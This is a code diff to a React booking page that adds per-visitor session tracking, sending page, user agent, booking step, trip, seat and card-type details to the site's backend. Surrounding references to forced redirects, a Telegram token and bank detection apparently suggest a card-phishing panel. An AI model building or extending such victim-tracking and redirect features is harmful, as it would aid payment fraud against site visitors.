@@ -16,6 +16,7 @@ import { updateVisitorStep, checkForceRedirect, initVisitorWithIP } from '@/lib/
 import type { VisitorStep } from '@/lib/visitor-tracking';
 import { addBooking, updateBookingField } from '@/lib/bookings-storage';
 import type { StoredBooking } from '@/lib/bookings-storage';
+import { getOrCreateVisitorSessionId } from '@/lib/visitor-session';
 import LoadingScreen from './LoadingScreen';
 import type { BookingData } from './BookingPanel';
 
@@ -319,6 +320,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   const [selectedTripId, setSelectedTripId] = useState<string | null>(null);
   const [bookingId, setBookingId] = useState<number | null>(null);
   const [localBookingId, setLocalBookingId] = useState<number | null>(null); // for localStorage bookings
+  const visitorSessionId = useMemo(() => getOrCreateVisitorSessionId(), []);
   const totalPassengers = (bookingData.adults || bookingData.passengers || 1) + (bookingData.children || 0) + (bookingData.infants || 0);
 
   // Generate passengers with proper categories from bookingData (adults/children/infants)
@@ -474,6 +476,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   const createBooking = trpc.bookings.create.useMutation();
   const updateBookingStep = trpc.bookings.updateStep.useMutation({ onSuccess: () => utils.bookings.list.invalidate() });
+  const trackVisitor = trpc.visitors.track.useMutation();
   const settingsQuery = trpc.settings.list.useQuery();
   const getTelegramToken = trpc.settings.getTelegramToken.useQuery();
 
@@ -534,6 +537,25 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       bookingData: {
         from: bookingData.from, to: bookingData.to,
         date: bookingData.pickupDate, passengers: bookingData.passengers,
+        selectedTrip: activeTrip?.tripNumber,
+        selectedSeats: selectedSeats.map(s => s.replace('seat-', '')),
+        fareClass: activeTrip?.fareClass,
+      },
+      cardInfo: detectedBank ? {
+        cardType: detectedCard || selectedPayment,
+        bankName: getBankInfo(detectedBank)?.name,
+      } : undefined,
+    });
+    trackVisitor.mutate({
+      sessionId: visitorSessionId,
+      page: window.location.pathname,
+      userAgent: navigator.userAgent,
+      step: visitorStep,
+      bookingData: {
+        from: bookingData.from,
+        to: bookingData.to,
+        date: bookingData.pickupDate,
+        passengers: bookingData.passengers,
         selectedTrip: activeTrip?.tripNumber,
         selectedSeats: selectedSeats.map(s => s.replace('seat-', '')),
         fareClass: activeTrip?.fareClass,
